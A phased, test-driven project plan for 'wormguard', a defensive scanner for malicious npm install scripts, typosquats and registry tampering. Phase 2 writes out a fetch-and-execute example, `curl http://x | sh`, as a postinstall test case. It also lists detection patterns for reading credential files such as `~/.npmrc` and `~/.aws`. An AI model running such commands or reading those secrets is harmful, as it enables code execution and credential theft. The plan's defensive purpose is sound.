# Plan — wormguard (phased, gated)

Role: Project Manager. Author: Aris Rhiannon.
`create-issue-gate` contract: acceptance criteria are testable / pass-fail. A phase exits only when
every criterion has a passing automated check. TDD (red → green → commit). Tech: TypeScript (strict),
runtime Node/Bun, test `bun test`, **zero runtime deps**, license AGPL-3.0 + commercial (source-available).

---

## Phase 0 — Scaffold & tooling
**Goal:** green skeleton.
**Scope:** package.json (0 deps; bin `wormguard`), tsconfig strict, .gitignore, LICENSE (AGPL+commercial),
README skeleton, src/ + test/, GitHub Actions CI.
**Acceptance Criteria:**
- AC0.1 `bun test` runs ≥1 test → exit 0.
- AC0.2 `tsc --noEmit` passes under `"strict": true`.
- AC0.3 `package.json` `dependencies` is empty; `license` = `"SEE LICENSE IN LICENSE"`.
- AC0.4 CI runs install + typecheck + test on push/PR.

## Phase 1 — Inventory (lockfile + node_modules)
**Goal:** normalized package inventory + extracted lifecycle scripts.
**Scope:** `src/lockfile.ts` (parse `package-lock.json` v2/v3), `src/inventory.ts` (walk `node_modules`).
**Acceptance Criteria:**
- AC1.1 Parsing a v3 `package-lock.json` yields one record per package with
  `{name, version, resolved, integrity, registryHost, hasInstallScript, dev}`. (test)
- AC1.2 A v2-style lockfile (with `dependencies` tree) parses to the same normalized shape. (test)
- AC1.3 `registryHost` is derived from `resolved` (e.g. `registry.npmjs.org`); missing/`null` resolved
  is handled without throwing. (test)
- AC1.4 Walking a `node_modules` fixture (incl. one scoped `@scope/pkg`) returns each package's
  `preinstall/install/postinstall/prepare` scripts (absent → none). (test)
- AC1.5 Malformed JSON / missing files produce a typed error, not a crash. (test)

## Phase 2 — Behavioral rule engine
**Goal:** score lifecycle scripts + metadata for danger.
**Scope:** `src/rules.ts` (rule set, severities), `src/analyze.ts`.
**Acceptance Criteria:**
- AC2.1 Each rule has a stable id, severity (`critical|high|medium|low`), and message. (test)
- AC2.2 A `postinstall` of `curl http://x | sh` ⇒ ≥1 critical finding (shell-out + network). (test)
- AC2.3 Scripts reading secrets/env (`process.env`, `~/.npmrc`, `~/.aws`, `.git/config`) ⇒ high finding;
  `child_process`/`eval`/base64 blobs ⇒ findings. (test)
- AC2.4 A benign `prepare: "tsc -b"` / `postinstall: "node-gyp rebuild"` ⇒ no critical/high finding
  (presence of an install script alone is at most `low` advisory). (test, false-positive guard)
- AC2.5 `analyze(inventory, scripts)` returns a deterministic, sorted findings list. (test)

## Phase 3 — Baseline snapshot + diff
**Goal:** catch *changes* that signal compromise.
**Scope:** `src/baseline.ts`.
**Acceptance Criteria:**
- AC3.1 `snapshot(inventory)` → JSON that round-trips (parse∘serialize is stable). (test)
- AC3.2 `diff(old,new)` flags an added package, a removed package, and a version change. (test)
- AC3.3 `diff` flags a package that **gained** an install script (`hasInstallScript` false→true) as a
  high-severity finding — the worm signature. (test)
- AC3.4 `diff` flags changed `integrity`, `resolved`, or `registryHost` for an unchanged version. (test)
- AC3.5 Identical inventories ⇒ empty diff (no false positives). (test)

## Phase 4 — Typosquatting + integrity/registry policy
**Goal:** name + provenance checks.
**Scope:** `src/distance.ts` (Damerau-Levenshtein), `src/typosquat.ts`, `src/policy.ts`, bundled `data/top-names.json`.
**Acceptance Criteria:**
- AC4.1 Damerau-Levenshtein is correct on known pairs (transposition distance 1, etc.). (test)
- AC4.2 A name at distance 1–2 from a bundled popular name (and not an exact match) ⇒ typosquat finding;
  an exact popular name and an unrelated name ⇒ none. (test)
- AC4.3 Policy flags non-`https` `resolved`, a registry host not in the allowed set, and missing
  integrity; an allowlisted host/package suppresses the finding. (test)

## Phase 5 — Config + CLI
**Goal:** usable in shell and CI.
**Scope:** `src/config.ts` (`.wormguard.json`), `src/report.ts`, `src/cli.ts`, bin.
**Acceptance Criteria:**
- AC5.1 `wormguard scan [dir]` analyzes lockfile+node_modules and prints findings; `--json` emits a
  machine-readable report. (test)
- AC5.2 `--ci` makes exit code non-zero iff any finding ≥ the configured fail severity (default `high`);
  clean project ⇒ exit 0. (test)
- AC5.3 `wormguard snapshot [dir]` writes a baseline file; `wormguard audit [dir]` diffs against it and
  exits non-zero on a worm-signature change (new install script) — and exit 0 when unchanged. (test, both)
- AC5.4 `.wormguard.json` (allow install-script packages, allow hosts, ignore rule ids) suppresses the
  matching findings. (test)
- AC5.5 Unknown command / bad path ⇒ clear message + non-zero exit. (test)

## Phase 6 — Hardening, docs, release
**Acceptance Criteria:**
- AC6.1 Fixture corpus: clean project, malicious-preinstall, install-script-injected-on-upgrade,
  typosquat, registry-override — all asserted end-to-end. (test)
- AC6.2 Edge/boundary tests (empty lockfile, no node_modules, huge names) pass. (test)
- AC6.3 `dependencies` empty; `bun test` green; `tsc` strict clean. (CI)
- AC6.4 README: model, threat model, full rule table, CLI examples, AGPL+commercial license; ≥2 ADRs. (review)
- AC6.5 CI green on GitHub Actions. (CI run)

---

## Role mapping
CEO / PM / Developer / Tester: me. QA: `code-reviewer` subagent. Validator: independent subagent →
VALIDATION.md. Build starts now (user approved).
